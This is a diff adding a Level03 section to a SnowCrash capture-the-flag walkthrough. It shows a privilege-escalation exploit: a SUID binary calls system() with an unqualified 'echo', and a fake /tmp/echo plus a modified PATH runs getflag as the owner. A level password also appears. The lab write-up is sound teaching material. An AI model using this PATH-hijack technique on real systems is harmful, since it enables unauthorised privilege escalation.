@@ -110,3 +110,46 @@ After that we have to log with `flag02` and give the password `ft_waNDReL0L`.
 When we are connected we just have to use `getflag`.
 
 When we got the flag we have to connect to the next level.
+
+## Level03
+
+At the start of the level we can see a file `level03`.
+
+```bash
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+level03@SnowCrash:~$ ./level03
+Exploit me
+```
+
+As we can see the file as a specific letter `s` in the permission. 
+The `s` permission means [SUID](https://en.wikipedia.org/wiki/Setuid), the file is executed with the user owner's permission, the owner is flag03.
+
+As we can see after running the binary the following message is `Exploit me`.
+
+For that we gonna used [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html)
+
+```bash
+level03@SnowCrash:~$ ltrace level03
+Can't execute `level03': No such file or directory
+PTRACE_SETOPTIONS: No such process
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                   = 2003
+geteuid()                                                   = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                      = 0
++++ exited (status 0) +++
+```
+
+As we can see, there is a system call with `/usr/bin/env` of the echo file. We have to modify our PATH env to run the program.
+
+```bash
+level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo && chmod 755 /tmp/echo && export PATH=/tmp/:$PATH && ./level03
+```
+After that we have to log with `level04` and give the password `qi0maab88jeaj46qoumi7maus`.
